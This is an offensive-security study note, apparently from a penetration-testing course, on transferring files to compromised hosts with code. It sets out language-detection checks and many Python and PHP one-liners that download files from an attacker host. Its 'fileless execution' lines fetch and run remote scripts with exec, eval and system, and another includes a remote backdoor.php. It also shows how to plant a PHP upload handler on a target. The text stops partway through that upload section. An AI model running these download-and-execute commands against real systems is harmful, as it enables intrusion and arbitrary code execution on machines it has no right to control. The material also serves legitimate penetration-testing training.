---
tags: [module/file-transfers, code, python, php, ruby, perl, javascript, vbscript, automation, evasion, level/advanced, practical]
---

# Transferring Files with Code - Practical Application

## Complete Code-Based File Transfer Workflow

Phase 1: Language Detection
Phase 2: Python Deep Dive
Phase 3: PHP Deep Dive
Phase 4: Ruby/Perl Alternatives
Phase 5: Windows Scripting (JS/VBS)
Phase 6: Upload Operations
Phase 7: Fileless Execution
Phase 8: Evasion Techniques
Phase 9: Automation

---

## Phase 1: Language Detection

### Linux Language Detection

# Check Python
python --version 2>/dev/null
python3 --version 2>/dev/null
which python python3 2>/dev/null

# Check PHP
php --version 2>/dev/null
which php 2>/dev/null

# Check Ruby
ruby --version 2>/dev/null
which ruby 2>/dev/null

# Check Perl
perl --version 2>/dev/null
which perl 2>/dev/null

### Windows Language Detection

# Check cscript (for JS/VBS)
cscript //nologo //version

# Check Python (if installed)
python --version
py --version

# Check PowerShell version
$PSVersionTable.PSVersion

---

## Phase 2: Python Deep Dive

### Python 2 Download Variations

# Basic download
python2 -c "import urllib; urllib.urlretrieve('http://10.10.14.5/file.sh', 'file.sh')"

# With proxy
python2 -c "import urllib; proxy=urllib.ProxyHandler({'http': 'http://proxy:8080'}); opener=urllib.build_opener(proxy); urllib.install_opener(opener); urllib.urlretrieve('http://10.10.14.5/file.sh', 'file.sh')"

# With authentication
python2 -c "import urllib; passman=urllib.HTTPPasswordMgrWithDefaultRealm(); passman.add_password(None, 'http://10.10.14.5', 'user', 'pass'); auth=urllib.HTTPBasicAuthHandler(passman); opener=urllib.build_opener(auth); urllib.install_opener(opener); urllib.urlretrieve('http://10.10.14.5/file.sh', 'file.sh')"

# Download and execute (fileless)
python2 -c "import urllib; exec urllib.urlopen('http://10.10.14.5/script.py').read()"

### Python 3 Download Variations

# Basic download
python3 -c "import urllib.request; urllib.request.urlretrieve('http://10.10.14.5/file.sh', 'file.sh')"

# With headers
python3 -c "import urllib.request; req=urllib.request.Request('http://10.10.14.5/file.sh', headers={'User-Agent': 'Mozilla/5.0'}); with urllib.request.urlopen(req) as resp, open('file.sh','wb') as f: f.write(resp.read())"

# With proxy
python3 -c "import urllib.request; proxy=urllib.request.ProxyHandler({'http': 'http://proxy:8080'}); opener=urllib.request.build_opener(proxy); urllib.request.install_opener(opener); urllib.request.urlretrieve('http://10.10.14.5/file.sh', 'file.sh')"

# Resume download
python3 -c "import urllib.request, os; fname='largefile.iso'; if os.path.exists(fname): mode='ab'; headers={'Range': 'bytes=%d-' % os.path.getsize(fname)}; else: mode='wb'; headers={}; req=urllib.request.Request('http://10.10.14.5/'+fname, headers=headers); with urllib.request.urlopen(req) as resp, open(fname, mode) as f: f.write(resp.read())"

# Fileless execution
python3 -c "import urllib.request; exec(urllib.request.urlopen('http://10.10.14.5/script.py').read())"

### Python with Requests Module

# Install requests if available
python3 -m pip install requests --user

# Download with requests
python3 -c "import requests; r=requests.get('http://10.10.14.5/file.sh', headers={'User-Agent':'Mozilla/5.0'}); open('file.sh','wb').write(r.content)"

# Stream large file
python3 -c "import requests; r=requests.get('http://10.10.14.5/largefile.iso', stream=True); with open('largefile.iso','wb') as f: for chunk in r.iter_content(chunk_size=8192): f.write(chunk)"

### Python Multi-Method Download Script

Save as py_download.py:

#!/usr/bin/env python3
import sys
import os

def download_urllib(url, output):
    import urllib.request
    urllib.request.urlretrieve(url, output)
    print(f"[+] Downloaded {output}")

def download_requests(url, output):
    import requests
    r = requests.get(url, stream=True)
    with open(output, 'wb') as f:
        for chunk in r.iter_content(8192):
            f.write(chunk)
    print(f"[+] Downloaded {output}")

def download_pycurl(url, output):
    import pycurl
    with open(output, 'wb') as f:
        c = pycurl.Curl()
        c.setopt(c.URL, url)
        c.setopt(c.WRITEDATA, f)
        c.perform()
        c.close()
    print(f"[+] Downloaded {output}")

def main():
    if len(sys.argv) < 3:
        print(f"Usage: {sys.argv[0]} <url> <output>")
        sys.exit(1)
    
    url = sys.argv[1]
    output = sys.argv[2]
    
    methods = [
        ('urllib', download_urllib),
        ('requests', download_requests),
        ('pycurl', download_pycurl)
    ]
    
    for name, method in methods:
        try:
            method(url, output)
            return
        except:
            continue
    
    print("[-] No download method succeeded")

if __name__ == "__main__":
    main()

---

## Phase 3: PHP Deep Dive

### PHP Download Variations

# Basic file_get_contents
php -r "file_put_contents('file.sh', file_get_contents('http://10.10.14.5/file.sh'));"

# fopen/fread method (more control)
php -r '$f=@fopen("http://10.10.14.5/file.sh","rb"); $l=@fopen("file.sh","wb"); while(!feof($f)){fwrite($l,fread($f,1024));} fclose($l); fclose($f);'

# With custom headers
php -r '$opts=["http"=>["header"=>"User-Agent: Mozilla/5.0\r\n"]]; $ctx=stream_context_create($opts); file_put_contents("file.sh", file_get_contents("http://10.10.14.5/file.sh", false, $ctx));'

# With proxy
php -r '$opts=["http"=>["proxy"=>"tcp://proxy:8080","request_fulluri"=>true]]; $ctx=stream_context_create($opts); file_put_contents("file.sh", file_get_contents("http://10.10.14.5/file.sh", false, $ctx));'

# With authentication
php -r '$opts=["http"=>["header"=>"Authorization: Basic ".base64_encode("user:pass")]]; $ctx=stream_context_create($opts); file_put_contents("file.sh", file_get_contents("http://10.10.14.5/file.sh", false, $ctx));'

### PHP Fileless Execution

# Execute bash script
php -r 'eval(file_get_contents("http://10.10.14.5/script.php"));'

# Download and run bash
php -r '$c=file_get_contents("http://10.10.14.5/script.sh"); system($c);'

# Include remote PHP (if allow_url_include=On)
php -r 'include "http://10.10.14.5/backdoor.php";'

### PHP Upload Function

# Create upload.php on target
cat > upload.php << 'EOF'
<?php
$target = "uploaded_file";
if (move_uploaded_file($_FILES['file']['tmp_name'], $target)) {
    echo "Uploaded to $target\n";
} else {
    echo "Upload failed\n";
}
?>
